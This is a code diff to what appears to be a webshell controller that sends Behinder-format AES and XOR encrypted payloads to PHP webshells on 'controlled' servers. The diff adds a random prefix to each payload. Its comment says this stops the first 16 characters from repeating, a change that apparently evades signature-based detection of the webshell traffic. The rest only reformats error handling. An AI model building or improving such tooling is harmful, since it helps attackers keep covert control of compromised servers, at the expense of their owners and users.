@@ -1,6 +1,7 @@
 import typing as t
 import hashlib
 import logging
+import random
 import base64
 
 from Crypto.Cipher import AES
@@ -39,25 +40,23 @@ def base64_encode(s):
     return base64.b64encode(s).decode()
 
 
+# 为了保证前16个字符不相同，我们需要在payload前方加入随机字符串
+
+
 def behinder_aes(payload: t.Union[str, bytes], key: bytes):
     """将给定的payload按照冰蝎的格式进行AES加密"""
+    pre = f"{random.randbytes(random.randint(1, 32)).hex()}|".encode()
+    payload_bytes = pre + (payload.encode() if isinstance(payload, str) else payload)
     iv = b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
     cipher = AES.new(key, AES.MODE_CBC, iv=iv)
-    if isinstance(payload, str):
-        payload = ("1|" + payload).encode()
-    else:
-        payload = b"1|" + payload
     payload_padded = pad(payload, AES.block_size)
     return base64_encode(cipher.encrypt(payload_padded))
 
 
 def behinder_xor(payload: t.Union[str, bytes], key: bytes):
     """将给定的payload按照冰蝎的格式进行Xor加密"""
-    if isinstance(payload, str):
-        payload_bytes = ("1|" + payload).encode()
-    else:
-        payload_bytes = b"1|" + payload
-
+    pre = f"{random.randbytes(random.randint(1, 32)).hex()}|".encode()
+    payload_bytes = pre + (payload.encode() if isinstance(payload, str) else payload)
     payload_xor = bytes([c ^ key[i + 1 & 15] for i, c in enumerate(payload_bytes)])
     return base64_encode(payload_xor)
 
@@ -142,7 +141,9 @@ class PHPWebshellBehinderAES(PHPWebshellCommunication, PHPWebshellActions):
                 self.client = get_http_client(verify=self.https_verify)
             raise exceptions.NetworkError("HTTP请求受控端超时") from exc
         except httpx.HTTPError as exc:
-            raise exceptions.NetworkError("发送HTTP请求到受控端失败：" + str(exc)) from exc
+            raise exceptions.NetworkError(
+                "发送HTTP请求到受控端失败：" + str(exc)
+            ) from exc
 
 
 @register_session
@@ -225,4 +226,6 @@ class PHPWebshellBehinderXor(PHPWebshellCommunication, PHPWebshellActions):
                 self.client = get_http_client(verify=self.https_verify)
             raise exceptions.NetworkError("HTTP请求受控端超时") from exc
         except httpx.HTTPError as exc:
-            raise exceptions.NetworkError("发送HTTP请求到受控端失败：" + str(exc)) from exc
+            raise exceptions.NetworkError(
+                "发送HTTP请求到受控端失败：" + str(exc)
+            ) from exc
